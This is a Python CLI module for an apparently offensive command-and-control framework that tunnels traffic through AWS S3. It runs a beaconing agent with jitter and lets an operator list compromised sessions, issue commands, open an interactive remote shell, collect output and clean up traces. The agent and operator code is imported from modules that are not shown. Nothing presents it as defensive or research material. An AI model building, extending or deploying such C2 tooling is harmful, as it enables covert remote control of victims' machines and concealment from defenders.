"""
Cloud C2 Runner - CLI interface
"""

import argparse
import sys
import json
from .agent import CloudC2Agent
from .operator import CloudC2Operator
from .utils import (
    validate_bucket_name,
    estimate_costs,
    format_session_table,
    export_sessions_json,
    generate_aws_policy
)


def main():
    """Main CLI interface"""
    parser = argparse.ArgumentParser(
        description="Cloud C2 Framework (AWS S3)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Run agent
  python -m cloud.run --agent --bucket my-c2 --access-key KEY --secret-key SECRET
  
  # List sessions
  python -m cloud.run --list --bucket my-c2 --access-key KEY --secret-key SECRET
  
  # Issue command
  python -m cloud.run --command "whoami" --session abc123 --bucket my-c2 --access-key KEY --secret-key SECRET
  
  # View results
  python -m cloud.run --results --session abc123 --bucket my-c2 --access-key KEY --secret-key SECRET
  
  # Interactive shell
  python -m cloud.run --shell --session abc123 --bucket my-c2 --access-key KEY --secret-key SECRET
  
  # Cleanup
  python -m cloud.run --cleanup --bucket my-c2 --access-key KEY --secret-key SECRET
  
  # Estimate costs
  python -m cloud.run --estimate-costs --agents 10 --interval 60 --days 30
        """
    )
    
    # AWS credentials
    parser.add_argument('--bucket', type=str,
                       help='S3 bucket name')
    parser.add_argument('--access-key', type=str,
                       help='AWS access key')
    parser.add_argument('--secret-key', type=str,
                       help='AWS secret key')
    parser.add_argument('--region', type=str, default='us-east-1',
                       help='AWS region (default: us-east-1)')
    
    # Operation modes
    parser.add_argument('--agent', action='store_true',
                       help='Run as agent')
    parser.add_argument('--list', action='store_true',
                       help='List sessions')
    parser.add_argument('--command', type=str,
                       help='Issue command')
    parser.add_argument('--session', type=str,
                       help='Target session ID')
    parser.add_argument('--results', action='store_true',
                       help='View results')
    parser.add_argument('--task', type=str,
                       help='Filter by task ID')
    parser.add_argument('--cleanup', action='store_true',
                       help='Clean up C2 data')
    parser.add_argument('--shell', action='store_true',
                       help='Interactive shell for session')
    parser.add_argument('--info', action='store_true',
                       help='Show session info')
    
    # Agent options
    parser.add_argument('--interval', type=int, default=60,
                       help='Beacon interval in seconds (default: 60)')
    parser.add_argument('--jitter', type=int, default=30,
                       help='Beacon jitter in seconds (default: 30)')
    
    # Output options
    parser.add_argument('--export', type=str,
                       help='Export sessions to JSON file')
    parser.add_argument('--verbose', action='store_true',
                       help='Verbose output')
    parser.add_argument('--delete-after-read', action='store_true',
                       help='Delete results after reading')
    
    # Utility options
    parser.add_argument('--estimate-costs', action='store_true',
                       help='Estimate AWS costs')
    parser.add_argument('--agents', type=int, default=10,
                       help='Number of agents for cost estimate')
    parser.add_argument('--days', type=int, default=30,
                       help='Number of days for cost estimate')
    parser.add_argument('--generate-policy', action='store_true',
                       help='Generate AWS IAM policy')
    parser.add_argument('--validate-bucket', type=str,
                       help='Validate bucket name')
    
    args = parser.parse_args()
    
    # Validate bucket name if requested
    if args.validate_bucket:
        is_valid, error = validate_bucket_name(args.validate_bucket)
        if is_valid:
            print(f"[+] Bucket name is valid: {args.validate_bucket}")
        else:
            print(f"[-] Invalid bucket name: {error}")
        return
    
    # Generate IAM policy if requested
    if args.generate_policy:
        if not args.bucket:
            print("[-] --bucket required for policy generation")
            sys.exit(1)
        
        policy = generate_aws_policy(args.bucket)
        print(json.dumps(policy, indent=2))
        return
    
    # Cost estimation
    if args.estimate_costs:
        costs = estimate_costs(
            num_agents=args.agents,
            beacon_interval=args.interval,
            days=args.days
        )
        
        print("="*60)
        print("AWS S3 COST ESTIMATE")
        print("="*60)
        print(f"Number of agents: {costs['num_agents']}")
        print(f"Beacon interval: {costs['beacon_interval']}s")
        print(f"Duration: {costs['days']} days")
        print()
        print(f"Beacons per day: {costs['beacons_per_day']:,}")
        print(f"Total storage: {costs['storage_gb']} GB")
        print(f"PUT requests: {costs['put_requests']:,}")
        print(f"GET requests: {costs['get_requests']:,}")
        print()
        print(f"Storage cost: ${costs['storage_cost']}")
        print(f"PUT cost: ${costs['put_cost']}")
        print(f"GET cost: ${costs['get_cost']}")
        print("="*60)
        print(f"Total cost: ${costs['total_cost']}")
        print(f"Cost per day: ${costs['cost_per_day']}")
        print("="*60)
        return
    
    # Check required arguments
    if not args.bucket or not args.access_key or not args.secret_key:
        if not (args.estimate_costs or args.validate_bucket or args.generate_policy):
            print("[-] --bucket, --access-key, and --secret-key are required")
            parser.print_help()
            sys.exit(1)
    
    # Agent mode
    if args.agent:
        print("="*60)
        print("CLOUD C2 AGENT")
        print("="*60)
        
        agent = CloudC2Agent(
            args.bucket,
            args.access_key,
            args.secret_key,
            region=args.region,
            beacon_interval=args.interval,
            jitter=args.jitter
        )
        
        print("="*60)
        print()
        
        agent.run()
        return
    
    # Operator mode
    operator = CloudC2Operator(
        args.bucket,
        args.access_key,
        args.secret_key,
        region=args.region
    )
    
    # List sessions
    if args.list:
        print("\n[*] Listing sessions...")
        sessions = operator.list_sessions(include_metadata=True)
        
        if sessions:
            print(format_session_table(sessions))
            print(f"\n[+] Total sessions: {len(sessions)}")
            
            # Export if requested
            if args.export:
                export_sessions_json(sessions, args.export)
        else:
            print("No sessions found")
        
        return
    
    # Session info
    if args.info:
        if not args.session:
            print("[-] --session required for --info")
            sys.exit(1)
        
        print(f"\n[*] Session info: {args.session}")
        info = operator.get_session_info(args.session)
        
        if info:
            print("="*60)
            print(json.dumps(info, indent=2))
            print("="*60)
        else:
            print("[-] Session not found")
        
        return
    
    # Interactive shell
    if args.shell:
        if not args.session:
            print("[-] --session required for --shell")
            sys.exit(1)
        
        operator.interactive_shell(args.session)
        return
    
    # Issue command
    if args.command:
        if not args.session:
            print("[-] --session required for --command")
            sys.exit(1)
        
        operator.issue_command(args.session, args.command)
        return
    
    # View results
    if args.results:
        print("\n[*] Retrieving results...")
        
        results = operator.get_results(
            session_id=args.session,
            task_id=args.task,
            delete_after_read=args.delete_after_read
        )
        
        if results:
            print("="*80)
            for result in results:
                print(f"\nSession: {result['session_id']}")
                print(f"Task: {result['task_id']}")
                print(f"Timestamp: {result['timestamp']}")
                print(f"\nOutput:")
                print("-"*80)
                print(result['output'])
                print("-"*80)
            
            print(f"\n[+] Total results: {len(results)}")
        else:
            print("No results found")
        
        return
    
    # Cleanup
    if args.cleanup:
        confirm = input(f"[!] Clean up session '{args.session or 'ALL'}'? (yes/no): ")
        
        if confirm.lower() == 'yes':
            operator.cleanup(session_id=args.session)
        else:
            print("[-] Cleanup cancelled")
        
        return
    
    # Default: show help
    parser.print_help()


if __name__ == "__main__":
    main()